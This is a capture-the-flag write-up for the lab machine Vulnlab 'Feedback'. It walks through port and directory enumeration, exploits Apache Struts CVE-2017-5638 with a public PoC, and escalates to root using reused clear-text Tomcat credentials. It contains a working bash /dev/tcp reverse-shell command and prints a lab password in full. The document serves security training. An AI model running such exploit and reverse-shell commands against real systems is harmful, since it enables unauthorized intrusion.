---
title: "Vulnlab - Feedback [Easy]"
category: ctf-writeup
layout: post
---

| Name          | OS             | Difficulty                             |
| ------------- | -------------- | -------------------------------------- |
| **Feedback** | Linux | <span style="color:green;">Easy</span> |

## Summary

We would find an Apache Tomcat server running, where we can fuzz it to find an endpoint called `/feedback` which then we can exploit a vulnerability in Apache Struts for gaining our initial foothold. Then we would find clear-text credentials while analyzing the Apache Tomcat's files which will give us the root access.

## Initial Foothold

We would start with a nmap scan:

```
syl@sylsec:~/vulnlab/Feedback$ sudo nmap -sS -sU 10.10.80.221 --min-rate 10000 --open -p-   
[sudo] password for syl: 
Starting Nmap 7.80 ( https://nmap.org ) at 2023-12-26 16:40 EET
Warning: 10.10.80.221 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.80.221
Host is up (0.17s latency).
Not shown: 65456 open|filtered ports, 52483 closed ports, 13129 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
8080/tcp open  http-proxy
```

Which would give us the SSH service and some kind of HTTP website, upon visiting the website we would find that this is the default installation for Apache Tomcat. We have free access to the examples of the Apache Tomcat, but not to the `/manager`.

>This initially made me think that we would have something to do with the sessions because we can edit it, so I went to fuzz the website further.

We can fuzz the website for any additional directories:

```
syl@sylsec:~/tools$ ffuf -w $commontxt -u http://10.10.80.221:8080/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.80.221:8080/FUZZ
 :: Wordlist         : FUZZ: /home/syl/tools/lists/SecLists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
________________________________________________

docs                    [Status: 302, Size: 0, Words: 1, Lines: 1]
examples                [Status: 302, Size: 0, Words: 1, Lines: 1]
feedback                [Status: 302, Size: 0, Words: 1, Lines: 1]
favicon.ico             [Status: 200, Size: 21588, Words: 19, Lines: 22]
host-manager            [Status: 302, Size: 0, Words: 1, Lines: 1]
manager                 [Status: 302, Size: 0, Words: 1, Lines: 1]
```

As we can see, we have the `/feedback` route, that consisted of two input fields, one for the name and one for the feedback.

![[Pasted image 20231226190051.png]]

We can inspect the source code of the page and there we can find this HTML comment:

```
<!-- Build with Java, Struts2 & Log4J -->
```

We would then use Google to find some exploit related to those technologies, and we would find that the website is actually vulnerable to **CVE-2017-5638,** which is related to Apache Struts, there is a [PoC of that exploit in GitHub](https://github.com/mazen160/struts-pwn). We can setup a listener for the port `4444` and run the exploit:

```
syl@sylsec:~/vulnlab/Feedback/exploits/struts-pwn$ python3 struts-pwn.py --url 'http://10.10.80.221:8080/feedback/logfeedback.action' -c 'bash -i >& /dev/tcp/10.8.0.107/4444 0>&1'

[*] URL: http://10.10.80.221:8080/feedback/logfeedback.action
[*] CMD: bash -i >& /dev/tcp/10.8.0.107/4444 0>&1
```

That would give us the initial shell.

## Privilege Escalation

We can start enumerating the system from our reverse shell with `linpeas`, and we would also need to spawn a stable `tty` shell, I used python for that matter.

```
tomcat@ip-10-10-10-7:/tmp$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Upon carefully reviewing the output from `linpeas`, we would find the configuration for Apache Tomcat containing clear-text credentials.

```
/opt/tomcat/conf/tomcat-users.xml
<user username="admin" password="H2R<REDACTED>" roles="manager-gui"/>
<user username="robot" password="H2R<REDACTED>" roles="manager-script"/>
```

We can try to switch to the user `ubuntu` which doesn't work, but the user `root` does.

```
tomcat@ip-10-10-10-7:/tmp$ su ubuntu
su ubuntu
Password: H2RR3rGDrbAnPxWa

su: Authentication failure
tomcat@ip-10-10-10-7:/tmp$ su root
su root
Password: H2RR3rGDrbAnPxWa

root@ip-10-10-10-7:/# whoami
whoami
root
root@ip-10-10-10-7:/# cat /root/root.txt
cat /root/root.txt
VL{<REDACTED>}
```